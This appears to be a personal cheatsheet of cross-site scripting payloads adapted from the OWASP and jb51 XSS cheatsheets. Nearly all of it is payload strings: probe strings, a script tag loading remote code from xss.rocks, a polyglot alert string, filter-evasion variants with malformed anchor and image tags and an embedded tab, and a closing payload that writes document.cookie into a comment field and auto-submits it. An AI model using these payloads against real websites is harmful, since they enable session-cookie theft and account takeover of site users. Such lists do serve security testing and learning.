xss

First, a couple of links:
https://www.jb51.net/tools/xss.htm
https://owasp.org/www-community/xss-filter-evasion-cheatsheet

Are two really good cheatsheets better than anything I'd hope to do!
This is mostly lifted from these, great resources to have for simple xss.

check strings

first two are simple, try first

'';!--"<XSS>=&{()}

<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>

more complex, can give you a lead on what is being filtered out on the page and what isn't.

';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

A lot of pages filter script tags out.  No matter, you can stick JS in a lot of other places and have it run.

Malformed a tags:
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>

Malformed image tags:

<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>

This has an embedded tab to get around a filter for the term "javascript"

<IMG SRC="jav	ascript:alert('XSS');">

<IMG """><SCRIPT>
document.addEventListener("DOMContentLoaded", function(){
    document.getElementsByName('comment')[0].value = document.cookie;
	document.getElementsByName('submit')[0].click();
})</SCRIPT>"\>
